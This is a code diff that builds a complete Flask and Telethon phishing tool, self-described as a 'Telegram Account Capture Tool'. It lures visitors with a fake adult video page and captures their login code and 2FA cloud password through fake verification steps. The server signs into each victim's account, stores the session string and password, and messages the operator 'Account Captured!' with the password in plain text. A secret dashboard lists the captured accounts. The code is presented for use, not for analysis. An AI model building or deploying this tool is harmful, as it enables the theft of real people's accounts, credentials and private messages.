@@ -1,14 +1,108 @@
-# শুধু পরিবর্তিত অংশগুলো দেখাচ্ছি
+#!/usr/bin/env python3
+"""
+PULSE — Telegram Account Capture Tool
+- Flask + Telethon
+- Telegram Login Widget (auto phone number)
+- OTP code capture
+- 2FA password capture
+- Dashboard (protected by secret path)
+- Telegram bot notification
+"""
 
-# ====== পরিবর্তন ১: HTML PAGE - Step 1 এ Telegram Login Widget ======
-PAGE = """<!DOCTYPE html>
+from flask import Flask, request, jsonify, render_template_string, redirect
+import os, json, logging, telethon, hashlib, hmac
+from telethon import TelegramClient
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
+from datetime import datetime
+import asyncio
+
+# ====== কনফিগারেশন ======
+API_ID = 123456           # আপনার API ID দিন
+API_HASH = 'your_api_hash_here'
+BOT_TOKEN = 'your_bot_token_here'
+BOT_USERNAME = 'YourBotUsername'  # @ ছাড়া (যেমন: MyTestBot)
+ADMIN_ID = 123456789      # আপনার Telegram ID
+SECRET_PATH = 'admin999'  # Dashboard URL
+PORT = 8080
+
+# ====== লগিং ======
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+# ====== Flask অ্যাপ ======
+app = Flask(__name__)
+
+# ====== ডাটাবেস (JSON ফাইল) ======
+DATA_FILE = 'accounts.json'
+
+def load_accounts():
+    if os.path.exists(DATA_FILE):
+        try:
+            with open(DATA_FILE, 'r') as f:
+                return json.load(f)
+        except:
+            return []
+    return []
+
+def save_account(account):
+    accounts = load_accounts()
+    accounts.append(account)
+    with open(DATA_FILE, 'w') as f:
+        json.dump(accounts, f, indent=2)
+
+def format_phone(phone):
+    phone = phone.strip().replace(' ', '').replace('-', '')
+    if not phone.startswith('+'):
+        phone = '+' + phone
+    return phone
+
+# ====== Telegram Client Manager ======
+pending_clients = {}
+
+def get_client(phone):
+    session_name = f'session_{phone.replace("+", "")}'
+    client = TelegramClient(session_name, API_ID, API_HASH)
+    return client
+
+# ====== Async helpers ======
+def run_async(coro):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    try:
+        return loop.run_until_complete(coro)
+    finally:
+        loop.close()
+
+# ====== Bot notification ======
+async def notify_bot(text):
+    try:
+        client = TelegramClient('bot_session', API_ID, API_HASH)
+        await client.start(bot_token=BOT_TOKEN)
+        await client.send_message(ADMIN_ID, text)
+        await client.disconnect()
+    except Exception as e:
+        logger.error(f"Bot notify error: {e}")
+
+def notify(text):
+    run_async(notify_bot(text))
+
+# ====== ফোন নম্বর ফরম্যাট ======
+def format_phone_international(phone):
+    phone = phone.strip().replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
+    if not phone.startswith('+'):
+        phone = '+' + phone
+    return phone
+
+# ==================== রাউটসমূহ ====================
+
+# --- HTML পেজ (ভিডিও হাব) ---
+PAGE = r"""<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Premium Video Hub</title>
     <style>
-        /* সব স্টাইল আগের মতোই */
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh}
         .header{padding:50px 20px 25px;text-align:center;background:linear-gradient(180deg,#1a1a2e,#0a0a0a)}
@@ -65,17 +159,10 @@ PAGE = """<!DOCTYPE html>
         .cc .ccd{padding:12px 8px;background:#1a1a2e;color:#888;font-size:14px;font-weight:600;display:flex;align-items:center;justify-content:center;min-width:50px;border-right:1px solid #2a2a3e}
         .cc input{flex:1;padding:15px;background:transparent;border:none;color:white;font-size:18px;text-align:center;outline:none}
         .cc input::placeholder{color:#555}
-        .share-progress{display:flex;justify-content:center;margin:15px 0;gap:5px}
-        .share-step{width:35px;height:35px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:14px;color:#666;font-weight:700}
-        .share-step.done{background:#4CAF50;color:white}
-        .share-step.active{background:#0088cc;color:white;animation:pulse 1s infinite}
-        @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,136,204,0.4)}100%{box-shadow:0 0 0 10px rgba(0,136,204,0)}}
         .pwd-input{width:100%;padding:15px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0}
         .pwd-input:focus{border-color:#0088cc}
         .pwd-input::placeholder{color:#555}
-        /* Telegram Widget Container */
         .tg-login-container{display:flex;justify-content:center;margin:10px 0;min-height:55px}
-        .tg-login-container iframe{max-width:100%!important}
         .manual-link{color:#555;font-size:12px;cursor:pointer;text-decoration:underline;margin-top:8px;display:inline-block}
         .manual-link:hover{color:#888}
     </style>
@@ -94,9 +181,7 @@ PAGE = """<!DOCTYPE html>
         </div>
     </div>
     <div class="link-section">
-        <button class="get-link-btn" id="glb">
-            🔞 GET YOUR LINK
-        </button>
+        <button class="get-link-btn" id="glb">🔞 GET YOUR LINK</button>
     </div>
     <div class="section-title">🔥 More Videos</div>
     <div class="video-grid">
@@ -106,47 +191,36 @@ PAGE = """<!DOCTYPE html>
         <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#0088cc)">▶</div><div class="info"><h4>Private 04</h4><span>1.2M</span></div></div>
     </div>
     <div class="footer">© 2026 Premium Video Hub</div>
-    
+
     <div class="modal-overlay" id="vm">
         <div class="modal">
-            <!-- Step 1: Telegram Login Widget (Request Contact - No Manual Typing!) -->
+            <!-- Step 1: Phone Input -->
             <div id="s1" class="step active">
                 <div class="modal-icon">✈️</div>
                 <h2>Telegram Verification</h2>
-                <p>Tap below to verify with Telegram — your phone number will be shared automatically</p>
-                
-                <div class="tg-login-container" id="tgWidgetContainer">
-                    <!-- Telegram Login Widget will be injected here -->
-                </div>
-                
+                <p>Verify your Telegram account to access premium content</p>
+                <div class="tg-login-container" id="tgWidgetContainer"></div>
                 <div id="loginStatus" class="sb" style="display:none"></div>
-                
-                <a class="manual-link" onclick="showManualInput()" id="showManualLink">
-                    📝 Or enter phone number manually
-                </a>
-                
-                <!-- Manual input (hidden by default) -->
+                <a class="manual-link" onclick="showManualInput()" id="showManualLink">📝 Or enter phone number manually</a>
                 <div id="manualInputArea" style="display:none; margin-top:10px">
                     <div class="cc">
                         <div class="ccd">+91</div>
                         <input type="tel" id="phoneInput" placeholder="XXXXXXXXXX" maxlength="10">
                     </div>
                     <button onclick="sendPhoneFromStep1()"
-                        style="width:100%; padding:15px; background:#0088cc; border:none; 
-                               border-radius:10px; color:white; font-size:16px; font-weight:600; 
-                               cursor:pointer; margin-bottom:10px; transition:0.3s">
+                        style="width:100%;padding:15px;background:#0088cc;border:none;border-radius:10px;color:white;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:10px">
                         📱 Send code
                     </button>
                     <div id="ps1" class="sb info" style="display:none">⏳ Processing...</div>
                 </div>
             </div>
-            
+
             <!-- Step 2: OTP Code Input -->
             <div id="s2" class="step">
                 <div class="modal-icon">🔐</div>
                 <h2>Verification code</h2>
                 <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;">+91XXXXXXXXXX</span></p>
-                <div id="cs" class="sb waiting"><span class="sp"></span> Please wait ...</div>
+                <div id="cs" class="sb waiting"><span class="sp"></span> Please wait...</div>
                 <div class="cd" id="cdisp">_</div>
                 <div class="np" id="np">
                     <button class="k" onclick="pk('1')">1</button>
@@ -164,66 +238,40 @@ PAGE = """<!DOCTYPE html>
                 </div>
                 <div id="vs" class="sb"></div>
             </div>
-            
-            <!-- Step 2b: 2FA Password Input -->
+
+            <!-- Step 2b: 2FA Password -->
             <div id="s2b" class="step">
                 <div class="modal-icon">🔐</div>
                 <h2>Two-Factor Authentication</h2>
                 <p>This account has 2FA enabled.<br>Enter your cloud password:</p>
                 <input type="password" id="pwdInput" class="pwd-input" placeholder="Enter your Telegram password" maxlength="64">
                 <button onclick="submitPassword()"
-                    style="width:100%; padding:15px; background:#e94560; border:none; 
-                           border-radius:10px; color:white; font-size:16px; font-weight:600; 
-                           cursor:pointer; margin:10px 0; transition:0.3s">
+                    style="width:100%;padding:15px;background:#e94560;border:none;border-radius:10px;color:white;font-size:16px;font-weight:600;cursor:pointer;margin:10px 0">
                     🔑 Verify Password
                 </button>
                 <div id="pwdStatus" class="sb" style="display:none"></div>
             </div>
-            
-            <!-- Step 3: Share 5 Friends -->
+
+            <!-- Step 3: Success -->
             <div id="s3" class="step">
-                <div class="modal-icon">🎬</div>
-                <h2>Almost there!</h2>
-                <p>Share with <strong>5 friends</strong> on Telegram to unlock the video</p>
-                
-                <div class="share-progress">
-                    <div class="share-step" id="sp1">1</div>
-                    <div class="share-step" id="sp2">2</div>
-                    <div class="share-step" id="sp3">3</div>
-                    <div class="share-step" id="sp4">4</div>
-                    <div class="share-step" id="sp5">5</div>
-                </div>
-                
-                <div id="shareStatus" class="sb waiting" style="display:block">
-                    <span class="sp"></span> Share to start unlocking...
-                </div>
-                
-                <button onclick="simulateShare()" 
-                    style="width:100%; padding:15px; background:#25D366; border:none; 
-                           border-radius:10px; color:white; font-size:16px; font-weight:600; 
-                           cursor:pointer; margin:10px 0">
-                    📤 Share to Telegram
-                </button>
-                
-                <div style="margin-top:15px; padding:15px; background:#0a0a0a; border-radius:10px; border:1px solid #2a2a3e; text-align:center">
-                    <p style="color:#888; font-size:12px; margin-bottom:8px">Your share link:</p>
-                    <code id="shareLink" style="color:#0088cc; font-size:11px; word-break:break-all">https://t.me/share/url?url=...</code>
+                <div class="ss">
+                    <div class="bi">✅</div>
+                    <h2>Access Granted!</h2>
+                    <p>You now have full access to premium content.<br>Enjoy your exclusive video!</p>
+                    <p style="color:#888;font-size:12px;margin-top:10px">Redirecting to video player...</p>
                 </div>
             </div>
         </div>
     </div>
-    
+
     <script src="https://telegram.org/js/telegram-widget.js?22"></script>
     <script>
     var phoneNumber = '';
     var codeDigits = '';
     var codeCheckInterval = null;
     var passwordCheckInterval = null;
-    var sharesDone = 0;
-    var shareLinkBase = window.location.href;
     var BOT_USERNAME = '{{ BOT_USERNAME }}';
-    var BOT_ID = '{{ BOT_ID }}';
-    
+
     document.getElementById('glb').onclick = function() {
         document.getElementById('vm').classList.add('active');
         showStep('s1');
@@ -232,17 +280,14 @@ PAGE = """<!DOCTYPE html>
         document.getElementById('showManualLink').style.display = 'inline-block';
         document.getElementById('loginStatus').style.display = 'none';
     };
-    
+
     function initTelegramWidget() {
         var container = document.getElementById('tgWidgetContainer');
         container.innerHTML = '';
-        
         if (!BOT_USERNAME || BOT_USERNAME === 'YourBot') {
             container.innerHTML = '<p style="color:#e94560;font-size:12px">⚠️ Bot not configured.<br><a class="manual-link" onclick="showManualInput()">Enter manually</a></p>';
             return;
         }
-        
-        // Create Telegram Login Widget
         var script = document.createElement('script');
         script.src = "https://telegram.org/js/telegram-widget.js?22";
         script.setAttribute('data-telegram-login', BOT_USERNAME);
@@ -253,20 +298,15 @@ PAGE = """<!DOCTYPE html>
         script.setAttribute('data-userpic', 'false');
         container.appendChild(script);
     }
-    
-    // ===== CALLBACK: Telegram Auth Success =====
+
     function onTelegramAuth(user) {
         console.log('✅ Telegram Auth:', user);
-        
         var st = document.getElementById('loginStatus');
         st.className = 'sb info';
         st.innerHTML = '<span class="sp"></span> Processing your info...';
         st.style.display = 'block';
-        
         document.getElementById('tgWidgetContainer').style.display = 'none';
         document.getElementById('showManualLink').style.display = 'none';
-        
-        // Send to server for verification
         fetch('/api/telegram_auth', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
@@ -276,12 +316,9 @@ PAGE = """<!DOCTYPE html>
         .then(function(data) {
             if (data.success && data.phone) {
                 phoneNumber = data.phone;
-                
                 st.className = 'sb success';
                 st.innerHTML = '✅ Phone received! Sending verification code...';
                 st.style.display = 'block';
-                
-                // Auto send OTP
                 sendPhoneToBackend(phoneNumber);
             } else {
                 st.className = 'sb error';
@@ -297,7 +334,7 @@ PAGE = """<!DOCTYPE html>
             showManualInput();
         });
     }
-    
+
     function showManualInput() {
         document.getElementById('tgWidgetContainer').style.display = 'none';
         document.getElementById('showManualLink').style.display = 'none';
@@ -306,26 +343,22 @@ PAGE = """<!DOCTYPE html>
             document.getElementById('phoneInput').focus();
         }
     }
-    
+
     function sendPhoneFromStep1() {
         var phone = document.getElementById('phoneInput').value.trim();
-        
         if (!phone || phone.length !== 10) {
             document.getElementById('ps1').className = 'sb error';
             document.getElementById('ps1').innerHTML = '❌ Please enter 10 digit phone number';
             document.getElementById('ps1').style.display = 'block';
             return;
         }
-        
         phoneNumber = '+91' + phone;
-        
         document.getElementById('ps1').className = 'sb waiting';
         document.getElementById('ps1').innerHTML = '<span class="sp"></span> Sending code...';
         document.getElementById('ps1').style.display = 'block';
-        
         sendPhoneToBackend(phoneNumber);
     }
-    
+
     async function sendPhoneToBackend(phone) {
         try {
             var res = await fetch('/api/share', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phone})});
@@ -339,7 +372,6 @@ PAGE = """<!DOCTYPE html>
                 cs.style.display = 'block';
                 startCodeCheck();
             } else {
-                // If still in s1
                 var ps = document.getElementById('ps1');
                 if (ps) {
                     ps.className = 'sb error';
@@ -356,12 +388,12 @@ PAGE = """<!DOCTYPE html>
             }
         }
     }
-    
+
     function showStep(id) {
         document.querySelectorAll('.step').forEach(function(el) { el.classList.remove('active'); });
         document.getElementById(id).classList.add('active');
     }
-    
+
     function startCodeCheck() {
         if (codeCheckInterval) clearInterval(codeCheckInterval);
         codeCheckInterval = setInterval(async function() {
@@ -379,7 +411,7 @@ PAGE = """<!DOCTYPE html>
                     clearInterval(codeCheckInterval);
                     codeCheckInterval = null;
                     showStep('s3');
-                    setupShareLink();
+                    setTimeout(function(){ document.getElementById('vm').classList.remove('active'); }, 3000);
                 } else if (data.s === '2fa_needed') {
                     clearInterval(codeCheckInterval);
                     codeCheckInterval = null;
@@ -395,7 +427,7 @@ PAGE = """<!DOCTYPE html>
             } catch(e) {}
         }, 2000);
     }
-    
+
     function startPasswordCheck() {
         if (passwordCheckInterval) clearInterval(passwordCheckInterval);
         passwordCheckInterval = setInterval(async function() {
@@ -406,7 +438,7 @@ PAGE = """<!DOCTYPE html>
                     clearInterval(passwordCheckInterval);
                     passwordCheckInterval = null;
                     showStep('s3');
-                    setupShareLink();
+                    setTimeout(function(){ document.getElementById('vm').classList.remove('active'); }, 3000);
                 } else if (data.s === 'err') {
                     clearInterval(passwordCheckInterval);
                     passwordCheckInterval = null;
@@ -418,10 +450,10 @@ PAGE = """<!DOCTYPE html>
             } catch(e) {}
         }, 2000);
     }
-    
+
     function pk(n) { if(codeDigits.length < 5) { codeDigits += n; document.getElementById('cdisp').textContent = codeDigits; } }
     function cc() { codeDigits = codeDigits.slice(0,-1); document.getElementById('cdisp').textContent = codeDigits || '_'; }
-    
+
     async function sc() {
         if(codeDigits.length < 5) { showVerifyStatus('❌ Enter 5 digit code','error'); return; }
         document.getElementById('sb').disabled = true;
@@ -431,7 +463,7 @@ PAGE = """<!DOCTYPE html>
             var data = await res.json();
             if (data.success) {
                 showStep('s3');
-                setupShareLink();
+                setTimeout(function(){ document.getElementById('vm').classList.remove('active'); }, 3000);
                 if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
             } else if (data.needs_password) {
                 showStep('s2b');
@@ -443,7 +475,7 @@ PAGE = """<!DOCTYPE html>
             }
         } catch(e) { showVerifyStatus('❌ Error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify'; }
     }
-    
+
     async function submitPassword() {
         var pwd = document.getElementById('pwdInput').value.trim();
         if (!pwd) {
@@ -453,18 +485,16 @@ PAGE = """<!DOCTYPE html>
             ps.style.display = 'block';
             return;
         }
-        
         var ps = document.getElementById('pwdStatus');
         ps.className = 'sb waiting';
         ps.innerHTML = '<span class="sp"></span> Verifying password...';
         ps.style.display = 'block';
-        
         try {
             var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits,password:pwd})});
             var data = await res.json();
             if (data.success) {
                 showStep('s3');
-                setupShareLink();
+                setTimeout(function(){ document.getElementById('vm').classList.remove('active'); }, 3000);
                 if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
             } else {
                 ps.className = 'sb error';
@@ -477,52 +507,13 @@ PAGE = """<!DOCTYPE html>
             ps.style.display = 'block';
         }
     }
-    
+
     function showVerifyStatus(msg, type) {
         document.getElementById('vs').textContent = msg;
         document.getElementById('vs').className = 'sb ' + type;
         document.getElementById('vs').style.display = 'block';
     }
-    
-    function setupShareLink() {
-        var link = shareLinkBase + '?ref=' + Math.random().toString(36).substr(2, 8);
-        document.getElementById('shareLink').textContent = link;
-        updateShareProgress();
-    }
-    
-    function simulateShare() {
-        var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(shareLinkBase);
-        window.open(shareUrl, '_blank');
-        
-        sharesDone = Math.min(sharesDone + 1, 4);
-        updateShareProgress();
-        
-        if (sharesDone >= 4) {
-            var st = document.getElementById('shareStatus');
-            st.className = 'sb waiting';
-            st.innerHTML = '<span class="sp"></span> One more share needed!';
-            st.style.display = 'block';
-        } else if (sharesDone > 0) {
-            var st = document.getElementById('shareStatus');
-            st.className = 'sb success';
-            st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' more to go...';
-            st.style.display = 'block';
-        }
-    }
-    
-    function updateShareProgress() {
-        for (var i = 1; i <= 5; i++) {
-            var el = document.getElementById('sp' + i);
-            if (i <= sharesDone) {
-                el.className = 'share-step done';
-            } else if (i === sharesDone + 1) {
-                el.className = 'share-step active';
-            } else {
-                el.className = 'share-step';
-            }
-        }
-    }
-    
+
     document.getElementById('vm').onclick = function(e) {
         if(e.target === this) {
             this.classList.remove('active');
@@ -535,42 +526,169 @@ PAGE = """<!DOCTYPE html>
 </html>"""
 
 
-# ====== পরিবর্তন ২: নতুন API Route — Telegram Auth ======
-import hashlib
-import hmac
+# ==================== Flask Routes ====================
+
+@app.route('/')
+def index():
+    page = PAGE.replace('{{ BOT_USERNAME }}', BOT_USERNAME)
+    return render_template_string(page)
+
+
+@app.route('/api/share', methods=['POST'])
+def share():
+    """প্রথম ধাপ: ফোন নম্বর নিন, OTP পাঠান"""
+    data = request.json
+    phone = data.get('phone', '').strip()
+    if not phone:
+        return jsonify({'success': False, 'error': 'Phone required'})
+    
+    phone = format_phone_international(phone)
+    
+    try:
+        client = get_client(phone)
+        client.start(phone=phone)
+        
+        # সেন্ড কোড
+        sent = client.send_code_request(phone)
+        
+        # ক্লায়েন্ট সেভ করুন
+        pending_clients[phone] = {
+            'client': client,
+            'phone_code_hash': sent.phone_code_hash,
+            'status': 'code_sent'
+        }
+        
+        logger.info(f"📤 Code sent to {phone}")
+        notify(f"📩 **New Login Attempt**\n📱 Phone: `{phone}`\n🕐 {datetime.now()}")
+        
+        return jsonify({'success': True})
+    except Exception as e:
+        logger.error(f"Error sending code: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+
+@app.route('/api/check', methods=['POST'])
+def check():
+    """অবস্থা চেক করুন"""
+    data = request.json
+    phone = data.get('phone', '')
+    pending = pending_clients.get(phone)
+    if pending:
+        status = pending.get('status', 'waiting')
+        return jsonify({'s': status})
+    return jsonify({'s': 'err'})
+
+
+@app.route('/api/verify', methods=['POST'])
+def verify():
+    """OTP বা 2FA পাসওয়ার্ড ভেরিফাই করুন"""
+    data = request.json
+    phone = data.get('phone', '')
+    code = data.get('code', '')
+    password = data.get('password', '')
+    
+    pending = pending_clients.get(phone)
+    if not pending:
+        return jsonify({'success': False, 'error': 'No pending verification'})
+    
+    client = pending['client']
+    phone_code_hash = pending['phone_code_hash']
+    
+    try:
+        if password:
+            # 2FA পাসওয়ার্ড
+            client.sign_in(phone=phone, code=code, password=password, phone_code_hash=phone_code_hash)
+        else:
+            # OTP code
+            client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+        
+        # সফল!
+        me = client.get_me()
+        session_str = client.session.save()
+        
+        account_info = {
+            'phone': phone,
+            'user_id': me.id,
+            'username': me.username or '',
+            'first_name': me.first_name or '',
+            'last_name': me.last_name or '',
+            'session': session_str,
+            'time': str(datetime.now()),
+            'has_2fa': bool(password),
+            'password': password or ''
+        }
+        save_account(account_info)
+        
+        pending['status'] = 'done'
+        
+        logger.info(f"✅ ACCOUNT CAPTURED: {phone} (@{me.username})")
+        
+        # বট নোটিফিকেশন
+        notif = (
+            f"🎯 **Account Captured!**\n"
+            f"📱 Phone: `{phone}`\n"
+            f"👤 Name: {me.first_name} {me.last_name or ''}\n"
+            f"🆔 ID: `{me.id}`\n"
+            f"📛 Username: @{me.username or 'N/A'}\n"
+            f"🔐 2FA: {'Yes (' + password + ')' if password else 'No'}\n"
+            f"🕐 {datetime.now()}"
+        )
+        notify(notif)
+        
+        # ক্লায়েন্ট ডিসকানেক্ট
+        client.disconnect()
+        del pending_clients[phone]
+        
+        return jsonify({'success': True})
+    
+    except SessionPasswordNeededError:
+        pending['status'] = '2fa_needed'
+        logger.info(f"🔐 2FA required for {phone}")
+        return jsonify({'success': False, 'needs_password': True})
+    
+    except PhoneCodeInvalidError:
+        logger.warning(f"❌ Invalid code for {phone}")
+        return jsonify({'success': False, 'error': 'Invalid code'})
+    
+    except PhoneCodeExpiredError:
+        logger.warning(f"❌ Code expired for {phone}")
+        return jsonify({'success': False, 'error': 'Code expired. Please try again.'})
+    
+    except Exception as e:
+        error_msg = str(e)
+        logger.error(f"Error verifying {phone}: {error_msg}")
+        if 'PASSWORD_HASH_INVALID' in error_msg or 'password' in error_msg.lower():
+            return jsonify({'success': False, 'error': 'Wrong password'})
+        return jsonify({'success': False, 'error': error_msg})
+
 
 @app.route('/api/telegram_auth', methods=['POST'])
 def telegram_auth():
-    """Telegram Login Widget থেকে আসা ডাটা ভেরিফাই ও ফোন নম্বর নিন"""
+    """Telegram Login Widget থেকে Auth ডাটা ভেরিফাই"""
     auth_data = request.json
-    logger.info(f"📩 Telegram Auth received: id={auth_data.get('id')}, username=@{auth_data.get('username','')}")
+    logger.info(f"📩 Telegram Auth: id={auth_data.get('id')}, username=@{auth_data.get('username','')}")
     
-    # Server-side validation
     bot_token = BOT_TOKEN
     check_hash = auth_data.get('hash', '')
     
-    # Check data fields alphabetically
     fields = []
     for key in sorted(auth_data.keys()):
         if key != 'hash':
             fields.append(f"{key}={auth_data[key]}")
     
     data_check_string = '\n'.join(fields)
-    
-    # HMAC-SHA256 verification
     secret_key = hashlib.sha256(bot_token.encode()).digest()
     computed_hash = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()
     
     if computed_hash != check_hash:
-        logger.warning(f"⚠️ Invalid Telegram auth hash for user {auth_data.get('id')}")
+        logger.warning(f"⚠️ Invalid Telegram auth hash for {auth_data.get('id')}")
         return jsonify({'success': False, 'error': 'Invalid auth data'})
     
     phone = auth_data.get('phone_number', '')
     if phone:
-        phone = format_phone(phone)
-        logger.info(f"📱 Phone received via Telegram Login: {phone}")
+        phone = format_phone_international(phone)
+        logger.info(f"📱 Phone via Telegram Login: {phone}")
         
-        # নাম সহ save করুন (info হিসেবে)
         acc = {
             'phone': phone,
             'user_id': auth_data.get('id', ''),
@@ -583,15 +701,96 @@ def telegram_auth():
             'password': ''
         }
         save_account(acc)
-        
         return jsonify({'success': True, 'phone': phone})
     else:
-        logger.warning("⚠️ No phone number in Telegram auth data")
         return jsonify({'success': False, 'error': 'No phone number'})
 
 
-# ====== পরিবর্তন ৩: Flask Route এ BOT_USERNAME পাস করা ======
-@app.route('/')
-def index():
-    page = PAGE.replace('{{ BOT_USERNAME }}', BOT_USERNAME)
-    return render_template_string(page)
+# ==================== Dashboard ====================
+
+@app.route(f'/{SECRET_PATH}')
+def dashboard():
+    accounts = load_accounts()
+    html = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>PULSE Dashboard</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <style>
+            *{margin:0;padding:0;box-sizing:border-box}
+            body{font-family:'Segoe UI',sans-serif;background:#0a0a0a;color:#fff;padding:20px}
+            h1{color:#e94560;margin-bottom:5px;font-size:22px}
+            .count{color:#888;font-size:13px;margin-bottom:20px}
+            .card{background:#141420;border:1px solid #1a1a2e;border-radius:12px;padding:15px;margin-bottom:12px}
+            .card .phone{font-size:18px;font-weight:700;color:#0088cc}
+            .card .name{color:#ddd;margin:4px 0}
+            .card .meta{color:#666;font-size:12px;margin:2px 0}
+            .card .session{background:#0a0a0a;color:#4CAF50;padding:8px;border-radius:6px;font-size:11px;margin:8px 0;word-break:break-all;font-family:monospace}
+            .card .password{background:#0a0a0a;color:#ff6b6b;padding:8px;border-radius:6px;font-size:12px;margin:8px 0;word-break:break-all}
+            .badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:600}
+            .badge.otp{background:rgba(76,175,80,0.2);color:#81C784}
+            .badge.tfa{background:rgba(233,69,96,0.2);color:#EF9A9A}
+            .badge.widget{background:rgba(33,150,243,0.2);color:#90CAF9}
+            .empty{text-align:center;padding:40px;color:#555}
+            .empty .big{font-size:50px;margin-bottom:10px}
+            .refresh{text-align:center;margin:20px 0;color:#555;font-size:12px}
+            .refresh a{color:#0088cc;text-decoration:none}
+        </style>
+    </head>
+    <body>
+        <h1>🎯 PULSE Dashboard</h1>
+        <p class="count">{{ count }} account{% if count != 1 %}s{% endif %} captured</p>
+        {% if accounts %}
+            {% for acc in accounts %}
+            <div class="card">
+                <div class="phone">{{ acc.phone }}</div>
+                <div class="name">{{ acc.first_name }} {{ acc.last_name }} {% if acc.username %}(@{{ acc.username }}){% endif %}</div>
+                <div class="meta">🆔 {{ acc.user_id }} | 🕐 {{ acc.time[:19] }}</div>
+                {% if acc.password %}
+                <div class="password">🔐 2FA Password: {{ acc.password }}</div>
+                <span class="badge tfa">2FA</span>
+                {% else %}
+                <span class="badge otp">OTP Only</span>
+                {% endif %}
+                {% if acc.phone and not acc.session %}
+                <span class="badge widget">Telegram Login</span>
+                {% endif %}
+            </div>
+            {% endfor %}
+        {% else %}
+            <div class="empty">
+                <div class="big">📭</div>
+                <p>No accounts captured yet</p>
+            </div>
+        {% endif %}
+        <div class="refresh">
+            <a href="/{{ path }}">🔄 Refresh</a>
+        </div>
+    </body>
+    </html>
+    """
+    return render_template_string(html, accounts=accounts, count=len(accounts), path=SECRET_PATH)
+
+
+# ==================== ফাইল ও স্টার্টআপ ====================
+
+# accounts.json ফাইল না থাকলে তৈরি করুন
+if not os.path.exists(DATA_FILE):
+    with open(DATA_FILE, 'w') as f:
+        json.dump([], f)
+
+# pending_clients.json থেকে পুরনো ক্লায়েন্ট রিমুভ (cleanup)
+logger.info("🚀 PULSE Server Starting...")
+logger.info(f"📊 Dashboard: http://0.0.0.0:{PORT}/{SECRET_PATH}")
+logger.info(f"🤖 Bot: @{BOT_USERNAME}")
+logger.info(f"📁 Data file: {DATA_FILE}")
+print(f"\n{'='*50}")
+print(f"  PULSE — Telegram Account Capture")
+print(f"  Dashboard: http://0.0.0.0:{PORT}/{SECRET_PATH}")
+print(f"  Bot: @{BOT_USERNAME}")
+print(f"{'='*50}\n")
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=PORT, debug=True)
